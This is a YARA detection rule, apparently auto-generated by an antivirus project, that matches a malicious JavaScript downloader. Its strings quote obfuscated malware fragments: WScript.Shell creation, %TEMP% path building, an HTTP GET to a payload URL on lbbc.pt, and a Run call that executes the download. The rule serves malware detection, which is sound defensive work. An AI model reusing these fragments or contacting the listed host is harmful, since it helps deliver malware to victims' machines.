rule sig_20160427_b66a04b0c27704d7897d7db02738df2a {
  meta:
    description = "datamaliciousorder - file 20160427_b66a04b0c27704d7897d7db02738df2a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7788f5c08cd1e8c030e17162f14d4aea862f7776c3ad156fc0fbc13ab92d5f92"

  strings:
    $s1  = "function FcbtwIyhxc() {return KqmmbZyvre[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"86BHdcC" ascii
    $s2  = "function FcbtwIyhxc() {return KqmmbZyvre[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"86BHdcC" ascii
    $s3  = "var KqmmbZyvre = function OtrgsXhqbm() {return ZdrwoNvfuj[YwkszIkhgc](\"WScript\"+\".Shell\");}(), IofvvDuntg = 11;" fullword ascii
    $s4  = "OodoyQdrzk[DrkqgMerge](\"G\" + \"ET\", \"http://lbbc.pt/n8wisd\", false);" fullword ascii
    $s5  = "var ZdrwoNvfuj = this[\"WScript\"];" fullword ascii
    $s6  = "function TfinjVsbek(){return StlukYgkqq + \"\";};" fullword ascii
    $s7  = "function EbfjqJuytz(JcausDqdgw, ZndfoTiaaa){OwcvuXslyf = OwcvuXslyf * 1; return JcausDqdgw - ZndfoTiaaa;};" fullword ascii
    $s8  = "if (OodoyQdrzk[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function BvinhGvqcw() {return ((WwskxFuozy == true) && (WwskxFuozy == HfjowLqqbr)) ? 1 : OwcvuXslyf;};" fullword ascii
    $s10 = "var FbjisAwvkk = new this[\"D\"+\"ate\"]();" fullword ascii
    $s11 = "WwskxFuozy = true; " fullword ascii
    $s12 = "function ZrcfmHtwjd()" fullword ascii
    $s13 = "function XpeuaIaipf(){return 23;};" fullword ascii
    $s14 = "return EbfjqJuytz(MegoxVamel, BmvtxKlkjn);" fullword ascii
    $s15 = "function UyvvrIixuu(TxwmaLnkxu){KqmmbZyvre[\"R\"+\"un\"](TxwmaLnkxu, OwcvuXslyf, OwcvuXslyf);};" fullword ascii
    $s16 = "}while (RmlusJnvky);" fullword ascii
    $s17 = "var MlteyOtbqa = false;" fullword ascii
    $s18 = "HfjowLqqbr = true; " fullword ascii
    $s19 = "var HfjowLqqbr = false;" fullword ascii
    $s20 = "function PugleApsxt(){return YwkszIkhgc;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}